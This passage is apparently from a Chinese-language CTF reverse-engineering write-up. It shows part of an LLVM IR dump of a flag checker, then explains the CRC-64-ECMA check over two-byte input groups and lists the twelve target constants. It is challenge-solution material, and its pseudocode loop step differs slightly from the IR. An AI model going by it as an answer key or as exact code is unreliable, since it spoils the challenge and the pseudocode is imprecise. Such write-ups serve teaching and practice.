<span class="selector-attr">[12 x i64]</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">enc</span>, <span class="selector-tag">i64</span> <span class="number">0</span>, <span class="selector-tag">i64</span> %<span class="number">3</span></span><br><span class="line">  %<span class="number">4</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">arrayidx5</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">cmp6</span> = <span class="selector-tag">icmp</span> <span class="selector-tag">ne</span> <span class="selector-tag">i64</span> %<span class="number">2</span>, %<span class="number">4</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">i1</span> %<span class="selector-tag">cmp6</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.then</span>, <span class="selector-tag">label</span> %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.then</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body</span></span><br><span class="line">  %<span class="selector-tag">call7</span> = <span class="selector-tag">call</span> <span class="selector-tag">i32</span> (ptr, ...) @<span class="selector-tag">printf</span>(ptr noundef @<span class="string">&quot;??_C@_06JPHCLLC@Error?$CB?$AA@&quot;</span>)</span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i32</span> <span class="number">0</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">retval</span>, <span class="selector-tag">align</span> <span class="number">4</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">return</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">if</span><span class="selector-class">.end</span>:                                           ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.body</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.inc</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.inc</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">if</span><span class="selector-class">.end</span></span><br><span class="line">  %<span class="number">5</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">add</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">5</span>, <span class="number">2</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">add</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">i</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="number">6</span> = <span class="selector-tag">load</span> <span class="selector-tag">i64</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  %<span class="selector-tag">inc</span> = <span class="selector-tag">add</span> <span class="selector-tag">i64</span> %<span class="number">6</span>, <span class="number">1</span></span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i64</span> %<span class="selector-tag">inc</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">j</span>, <span class="selector-tag">align</span> <span class="number">8</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">for</span><span class="selector-class">.cond</span>, !<span class="selector-tag">llvm</span><span class="selector-class">.loop</span> !<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">for</span><span class="selector-class">.end</span>:                                          ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.cond</span></span><br><span class="line">  %<span class="selector-tag">call8</span> = <span class="selector-tag">call</span> <span class="selector-tag">i32</span> (ptr, ...) @<span class="selector-tag">printf</span>(ptr noundef @<span class="string">&quot;??_C@_07PBILKAFL@Success?$AA@&quot;</span>)</span><br><span class="line">  <span class="selector-tag">store</span> <span class="selector-tag">i32</span> <span class="number">0</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">retval</span>, <span class="selector-tag">align</span> <span class="number">4</span></span><br><span class="line">  <span class="selector-tag">br</span> <span class="selector-tag">label</span> %<span class="selector-tag">return</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">return</span>:                                           ; <span class="selector-tag">preds</span> = %<span class="selector-tag">for</span><span class="selector-class">.end</span>, %<span class="selector-tag">if</span><span class="selector-class">.then</span></span><br><span class="line">  %<span class="number">7</span> = <span class="selector-tag">load</span> <span class="selector-tag">i32</span>, <span class="selector-tag">ptr</span> %<span class="selector-tag">retval</span>, <span class="selector-tag">align</span> <span class="number">4</span></span><br><span class="line">  <span class="selector-tag">ret</span> <span class="selector-tag">i32</span> %<span class="number">7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: readwrite)</span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.memcpy</span><span class="selector-class">.p0</span><span class="selector-class">.p0</span><span class="selector-class">.i64</span>(ptr noalias nocapture writeonly, ptr noalias nocapture readonly, i64, i1 immarg) <span class="selector-id">#2</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: write)</span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.memset</span><span class="selector-class">.p0</span><span class="selector-class">.i64</span>(ptr nocapture writeonly, i8, i64, i1 immarg) <span class="selector-id">#3</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">printf</span>(ptr noundef %_Format, ...) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Result = alloca i32, align 4</span><br><span class="line">  %_ArgList = alloca ptr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  call void @llvm.va_start(ptr %_ArgList)</span><br><span class="line">  %0 = load ptr, ptr %_ArgList, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %call = call ptr @__acrt_iob_func(i32 noundef 1)</span><br><span class="line">  %call1 = call i32 @_vfprintf_l(ptr noundef %call, ptr noundef %1, ptr noundef null, ptr noundef %0)</span><br><span class="line">  store i32 %call1, ptr %_Result, align 4</span><br><span class="line">  call void @llvm.va_end(ptr %_ArgList)</span><br><span class="line">  %2 = load i32, ptr %_Result, align 4</span><br><span class="line">  ret i32 %2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">scanf</span>(ptr noundef %_Format, ...) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Result = alloca i32, align 4</span><br><span class="line">  %_ArgList = alloca ptr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  call void @llvm.va_start(ptr %_ArgList)</span><br><span class="line">  %0 = load ptr, ptr %_ArgList, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %call = call ptr @__acrt_iob_func(i32 noundef 0)</span><br><span class="line">  %call1 = call i32 @_vfscanf_l(ptr noundef %call, ptr noundef %1, ptr noundef null, ptr noundef %0)</span><br><span class="line">  store i32 %call1, ptr %_Result, align 4</span><br><span class="line">  call void @llvm.va_end(ptr %_ArgList)</span><br><span class="line">  %2 = load i32, ptr %_Result, align 4</span><br><span class="line">  ret i32 %2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i64</span> @<span class="selector-tag">strlen</span>(ptr noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nosync</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.va_start</span>(ptr) <span class="selector-id">#6</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">_vfprintf_l</span>(ptr noundef %_Stream, ptr noundef %_Format, ptr noundef %_Locale, ptr noundef %_ArgList) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_ArgList.addr = alloca ptr, align 8</span><br><span class="line">  %_Locale.addr = alloca ptr, align 8</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Stream.addr = alloca ptr, align 8</span><br><span class="line">  store ptr %_ArgList, ptr %_ArgList.addr, align 8</span><br><span class="line">  store ptr %_Locale, ptr %_Locale.addr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  store ptr %_Stream, ptr %_Stream.addr, align 8</span><br><span class="line">  %0 = load ptr, ptr %_ArgList.addr, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Locale.addr, align 8</span><br><span class="line">  %2 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %3 = load ptr, ptr %_Stream.addr, align 8</span><br><span class="line">  %call = call ptr @__local_stdio_printf_options()</span><br><span class="line">  %4 = load i64, ptr %call, align 8</span><br><span class="line">  %call1 = call i32 @__stdio_common_vfprintf(i64 noundef %4, ptr noundef %3, ptr noundef %2, ptr noundef %1, ptr noundef %0)</span><br><span class="line">  ret i32 %call1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">ptr</span> @<span class="selector-tag">__acrt_iob_func</span>(i32 noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nosync</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">void</span> @<span class="selector-tag">llvm</span><span class="selector-class">.va_end</span>(ptr) <span class="selector-id">#6</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">__stdio_common_vfprintf</span>(i64 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">ptr</span> @<span class="selector-tag">__local_stdio_printf_options</span>() <span class="selector-id">#0</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  ret ptr @&quot;?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">_vfscanf_l</span>(ptr noundef %_Stream, ptr noundef %_Format, ptr noundef %_Locale, ptr noundef %_ArgList) <span class="selector-id">#4</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  %_ArgList.addr = alloca ptr, align 8</span><br><span class="line">  %_Locale.addr = alloca ptr, align 8</span><br><span class="line">  %_Format.addr = alloca ptr, align 8</span><br><span class="line">  %_Stream.addr = alloca ptr, align 8</span><br><span class="line">  store ptr %_ArgList, ptr %_ArgList.addr, align 8</span><br><span class="line">  store ptr %_Locale, ptr %_Locale.addr, align 8</span><br><span class="line">  store ptr %_Format, ptr %_Format.addr, align 8</span><br><span class="line">  store ptr %_Stream, ptr %_Stream.addr, align 8</span><br><span class="line">  %0 = load ptr, ptr %_ArgList.addr, align 8</span><br><span class="line">  %1 = load ptr, ptr %_Locale.addr, align 8</span><br><span class="line">  %2 = load ptr, ptr %_Format.addr, align 8</span><br><span class="line">  %3 = load ptr, ptr %_Stream.addr, align 8</span><br><span class="line">  %call = call ptr @__local_stdio_scanf_options()</span><br><span class="line">  %4 = load i64, ptr %call, align 8</span><br><span class="line">  %call1 = call i32 @__stdio_common_vfscanf(i64 noundef %4, ptr noundef %3, ptr noundef %2, ptr noundef %1, ptr noundef %0)</span><br><span class="line">  ret i32 %call1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">declare</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">i32</span> @<span class="selector-tag">__stdio_common_vfscanf</span>(i64 noundef, ptr noundef, ptr noundef, ptr noundef, ptr noundef) <span class="selector-id">#5</span></span><br><span class="line"></span><br><span class="line">; <span class="selector-tag">Function</span> <span class="selector-tag">Attrs</span>: <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span></span><br><span class="line"><span class="selector-tag">define</span> <span class="selector-tag">linkonce_odr</span> <span class="selector-tag">dso_local</span> <span class="selector-tag">ptr</span> @<span class="selector-tag">__local_stdio_scanf_options</span>() <span class="selector-id">#0</span> <span class="selector-tag">comdat</span> &#123;</span><br><span class="line">entry:</span><br><span class="line">  ret ptr @&quot;?_OptionsStorage@?1??__local_stdio_scanf_options@@9@4_KA&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#0</span> = &#123; <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span> &quot;<span class="selector-tag">min-legal-vector-width</span>&quot;=&quot;<span class="number">0</span>&quot; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#1</span> = &#123; <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">norecurse</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span> &quot;<span class="selector-tag">min-legal-vector-width</span>&quot;=&quot;<span class="number">0</span>&quot; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#2</span> = &#123; <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: readwrite) &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#3</span> = &#123; <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> <span class="selector-tag">memory</span>(<span class="attribute">argmem</span>: write) &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#4</span> = &#123; <span class="selector-tag">mustprogress</span> <span class="selector-tag">noinline</span> <span class="selector-tag">optnone</span> <span class="selector-tag">uwtable</span> &quot;<span class="selector-tag">min-legal-vector-width</span>&quot;=&quot;<span class="number">0</span>&quot; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#5</span> = &#123; &quot;<span class="selector-tag">no-trapping-math</span>&quot;=&quot;<span class="selector-tag">true</span>&quot; &quot;<span class="selector-tag">stack-protector-buffer-size</span>&quot;=&quot;<span class="number">8</span>&quot; &quot;<span class="selector-tag">target-cpu</span>&quot;=&quot;<span class="selector-tag">x86-64</span>&quot; &quot;<span class="selector-tag">target-features</span>&quot;=&quot;+<span class="selector-tag">cmov</span>,+<span class="selector-tag">cx8</span>,+<span class="selector-tag">fxsr</span>,+<span class="selector-tag">mmx</span>,+<span class="selector-tag">sse</span>,+<span class="selector-tag">sse2</span>,+<span class="selector-tag">x87</span>&quot; &quot;<span class="selector-tag">tune-cpu</span>&quot;=&quot;<span class="selector-tag">generic</span>&quot; &#125;</span><br><span class="line"><span class="selector-tag">attributes</span> <span class="selector-id">#6</span> = &#123; <span class="selector-tag">nocallback</span> <span class="selector-tag">nofree</span> <span class="selector-tag">nosync</span> <span class="selector-tag">nounwind</span> <span class="selector-tag">willreturn</span> &#125;</span><br><span class="line"></span><br><span class="line">!<span class="selector-tag">llvm</span><span class="selector-class">.linker</span><span class="selector-class">.options</span> = !&#123;!<span class="number">0</span>, !<span class="number">1</span>, !<span class="number">2</span>, !<span class="number">3</span>, !<span class="number">4</span>, !<span class="number">5</span>, !<span class="number">6</span>&#125;</span><br><span class="line">!<span class="selector-tag">llvm</span><span class="selector-class">.module</span><span class="selector-class">.flags</span> = !&#123;!<span class="number">7</span>, !<span class="number">8</span>, !<span class="number">9</span>, !<span class="number">10</span>&#125;</span><br><span class="line">!<span class="selector-tag">llvm</span><span class="selector-class">.ident</span> = !&#123;!<span class="number">11</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;!&quot;/FAILIFMISMATCH:\22_CRT_STDIO_ISO_WIDE_SPECIFIERS=0\22&quot;&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!&quot;/FAILIFMISMATCH:\22_MSC_VER=1900\22&quot;&#125;</span><br><span class="line">!<span class="number">2</span> = !&#123;!&quot;/FAILIFMISMATCH:\22_ITERATOR_DEBUG_LEVEL=0\22&quot;&#125;</span><br><span class="line">!<span class="number">3</span> = !&#123;!&quot;/FAILIFMISMATCH:\22RuntimeLibrary=MT_StaticRelease\22&quot;&#125;</span><br><span class="line">!<span class="number">4</span> = !&#123;!&quot;/DEFAULTLIB:libcpmt.lib&quot;&#125;</span><br><span class="line">!<span class="number">5</span> = !&#123;!&quot;/FAILIFMISMATCH:\22annotate_string=0\22&quot;&#125;</span><br><span class="line">!<span class="number">6</span> = !&#123;!&quot;/FAILIFMISMATCH:\22annotate_vector=0\22&quot;&#125;</span><br><span class="line">!<span class="number">7</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">1</span>, !&quot;<span class="selector-tag">wchar_size</span>&quot;, <span class="selector-tag">i32</span> <span class="number">2</span>&#125;</span><br><span class="line">!<span class="number">8</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">8</span>, !&quot;<span class="selector-tag">PIC</span> <span class="selector-tag">Level</span>&quot;, <span class="selector-tag">i32</span> <span class="number">2</span>&#125;</span><br><span class="line">!<span class="number">9</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">7</span>, !&quot;<span class="selector-tag">uwtable</span>&quot;, <span class="selector-tag">i32</span> <span class="number">2</span>&#125;</span><br><span class="line">!<span class="number">10</span> = !&#123;<span class="selector-tag">i32</span> <span class="number">1</span>, !&quot;<span class="selector-tag">MaxTLSAlign</span>&quot;, <span class="selector-tag">i32</span> <span class="number">65536</span>&#125;</span><br><span class="line">!<span class="number">11</span> = !&#123;!&quot;<span class="selector-tag">clang</span> <span class="selector-tag">version</span> <span class="number">17.0</span><span class="selector-class">.1</span>&quot;&#125;</span><br><span class="line">!<span class="number">12</span> = <span class="selector-tag">distinct</span> !&#123;!<span class="number">12</span>, !<span class="number">13</span>&#125;</span><br><span class="line">!<span class="number">13</span> = !&#123;!&quot;<span class="selector-tag">llvm</span><span class="selector-class">.loop</span><span class="selector-class">.mustprogress</span>&quot;&#125;</span><br><span class="line">!<span class="number">14</span> = <span class="selector-tag">distinct</span> !&#123;!<span class="number">14</span>, !<span class="number">13</span>&#125;</span><br><span class="line">!<span class="number">15</span> = <span class="selector-tag">distinct</span> !&#123;!<span class="number">15</span>, !<span class="number">13</span>&#125;</span><br></pre></td></tr></table></figure></div>
<p>程序让用户输入一个字符串，然后<strong>每两个字符一组</strong>，使用
<code>calculate_crc64_direct</code> 函数进行 <strong>CRC64
校验</strong>，并与内置的 <code>@__const.main.enc</code> 中的 12 个
<code>i64</code> 常量值进行比较。如果全部匹配成功，则输出
<code>Success</code>，否则输出
<code>Error!</code>。然后我们就可以结合ai解读逆出解密脚本。</p>
<p>一、核心函数分析：<code>?calculate_crc64_direct@@YA_KPEBE_K@Z</code></p>
<p>这是一个计算 <strong>CRC64 校验值</strong> 的函数，签名为：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">calculate_crc64_direct</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">uint64_t</span> length)</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>算法流程简述：</p>
<ol type="1">
<li><p>初始化 <code>crc = -1</code>（即
<code>0xFFFFFFFFFFFFFFFF</code>）。</p></li>
<li><p>对每个字节：</p>
<p>将其左移 56 位并与 <code>crc</code> 异或。</p>
<p>然后进行 8 次循环（一个字节），每次：</p>
<ul>
<li><p>如果最高位为 1，则：</p>
<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">crc</span> = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0</span>x42F0E1EBA9EA3693</span><br></pre></td></tr></table></figure></div></li>
<li><p>否则：</p>
<div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crc</span> &lt;&lt;= <span class="number">1</span></span><br></pre></td></tr></table></figure></div></li>
</ul></li>
<li><p>最后再与 <code>0xFFFFFFFFFFFFFFFF</code>
异或（即按位取反）返回。</p></li>
</ol>
<p>这个是标准的 <strong>CRC-64-ECMA</strong> 算法。</p>
<p>二、主程序分析：<code>main</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input U flag:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, data)</span><br></pre></td></tr></table></figure></div>
<p>程序从控制台读取一串字符串（最多 65 个字符，保存在 <code>data</code>
数组里）。c</p>
<p>主体校验逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(data) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">    crc = calculate_crc64_direct(data + i, <span class="number">2</span>); <span class="comment">// 每次两个字符</span></span><br><span class="line">    <span class="keyword">if</span> (crc != enc[j]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>程序以<strong>2字节为一组</strong>（即两个字符）对输入串进行 CRC64
校验，并和 <code>enc[j]</code> 中的值对比。</p>
</blockquote>
<p>所以一共有 <code>12</code> 个 CRC64 值，意味着：</p>
<ul>
<li>一共会计算 <code>12</code> 次 CRC。</li>
<li>每次使用输入中的 2 字节作为输入。</li>
</ul>
<p>所以：<strong>输入长度应该正好是 24 字节（即 24
个字符）</strong>。</p>
<p>三、目标值 <code>enc</code></p>
<p>这是 CRC 校验目标值（正确 flag 的 CRC 分组）：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc[<span class="number">12</span>] = &#123;</span><br><span class="line">  <span class="number">-2565957437423125689</span>, <span class="number">224890624719110086</span>, <span class="number">1357324823849588894</span>,</span><br><span class="line">  <span class="number">-8941695979231947288</span>, <span class="number">-253413330424273460</span>, <span class="number">-7817463785137710741</span>,</span><br><span class="line">  <span class="number">-5620500441869335673</span>, <span class="number">984060876288820705</span>, <span class="number">-6993555743080142153</span>,</span><br><span class="line">  <span class="number">-7892488171899690683</span>, <span class="number">7190415315123037707</span>, <span class="number">-7218240302740981077</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>四、输入长度与数据块</p>
<p>每次取两个字符，使用 <code>calculate_crc64_direct</code> 校验：</p>
<p>也就是说：</p>
<ul>
<li>输入是一个 24 字节的字符串。</li>
<li>每次从 <code>i</code> 开始连续取两个字节，计算出 CRC。</li>
</ul>
<p>所以我们应当：</p>
<ul>
<li><strong>构造一个长度为 24
的字符串</strong>，使得它的每个连续两个字符的 CRC64
校验值对应上表中的目标。</li>
</ul>
